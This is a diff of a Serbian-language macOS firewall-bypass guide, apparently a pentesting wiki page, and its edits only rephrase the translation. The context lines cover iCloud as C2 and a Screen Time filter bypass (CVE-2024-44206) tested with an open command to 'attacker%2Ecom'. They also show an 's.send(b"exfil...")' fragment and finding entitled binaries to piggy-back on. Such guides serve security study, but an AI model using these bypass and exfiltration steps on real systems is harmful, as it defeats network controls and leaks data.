@@ -22,13 +22,13 @@ Sledeće tehnike su pronađene kao funkcionalne u nekim macOS firewall aplikacij
 
 Firewall bi mogao da dozvoli veze sa dobro poznatim apple domenama kao što su **`apple.com`** ili **`icloud.com`**. I iCloud bi mogao biti korišćen kao C2.
 
-### Opšti Bypass
+### Generički Bypass
 
 Neke ideje za pokušaj zaobilaženja firewalla
 
 ### Proverite dozvoljeni saobraćaj
 
-Poznavanje dozvoljenog saobraćaja će vam pomoći da identifikujete potencijalno domene na beloj listi ili koje aplikacije imaju dozvolu da im pristupe.
+Poznavanje dozvoljenog saobraćaja će vam pomoći da identifikujete potencijalno bele liste domene ili koje aplikacije imaju dozvolu da im pristupe.
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
@@ -76,7 +76,7 @@ macos-proces-abuse/
 
 ### Zaobilaženje filtera web sadržaja (Screen Time) – **CVE-2024-44206**
 U julu 2024. Apple je ispravio kritičnu grešku u Safari/WebKit koja je prekinula sistemski “filter web sadržaja” koji koriste roditeljske kontrole Screen Time.
-Posebno oblikovana URI (na primer, sa dvostruko URL-enkodiranim “://”) nije prepoznata od strane Screen Time ACL, ali je prihvaćena od strane WebKit-a, tako da se zahtev šalje nefiltriran. Bilo koji proces koji može otvoriti URL (uključujući sandboxed ili nesiguran kod) može stoga pristupiti domenama koje su eksplicitno blokirane od strane korisnika ili MDM profila.
+Posebno oblikovana URI (na primer, sa dvostruko URL-enkodiranim “://”) nije prepoznata od strane Screen Time ACL, ali je prihvaćena od strane WebKit-a, tako da se zahtev šalje nefiltrirano. Bilo koji proces koji može otvoriti URL (uključujući sandboxed ili nesiguran kod) može stoga pristupiti domenama koje su eksplicitno blokirane od strane korisnika ili MDM profila.
 
 Praktični test (sistem bez ispravki):
 ```bash
@@ -84,7 +84,7 @@ open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
 # if the patch is missing Safari will happily load the page
 ```
 ### Packet Filter (PF) pravilo-redosled greška u ranoj macOS 14 “Sonoma”
-Tokom beta ciklusa macOS 14, Apple je uveo regresiju u korisničkom prostoru oko **`pfctl`**.
+Tokom beta ciklusa macOS 14, Apple je uveo regresiju u korisničkom omotaču oko **`pfctl`**. 
 Pravila koja su dodata sa `quick` ključnom rečju (koju koriste mnogi VPN kill-switch-evi) su tiho ignorisana, uzrokujući curenje saobraćaja čak i kada je VPN/firewall GUI izvestio *blokirano*. Greška je potvrđena od strane nekoliko VPN dobavljača i ispravljena u RC 2 (build 23A344).
 
 Brza provera curenja:
@@ -109,11 +109,11 @@ s.send(b"exfil...")
 
 ## Saveti za alate za moderni macOS
 
-1. Istražite trenutna PF pravila koja generišu GUI vatrozidi:
+1. Ispitajte trenutna PF pravila koja generišu GUI vatrozidi:
 ```bash
 sudo pfctl -a com.apple/250.ApplicationFirewall -sr
 ```
-2. Nabrojite binarne datoteke koje već imaju *outgoing-network* pravo (korisno za piggy-backing):
+2. Enumerišite binarne datoteke koje već imaju *outgoing-network* pravo (korisno za piggy-backing):
 ```bash
 codesign -d --entitlements :- /path/to/bin 2>/dev/null \
 | plutil -extract com.apple.security.network.client xml1 -o - -
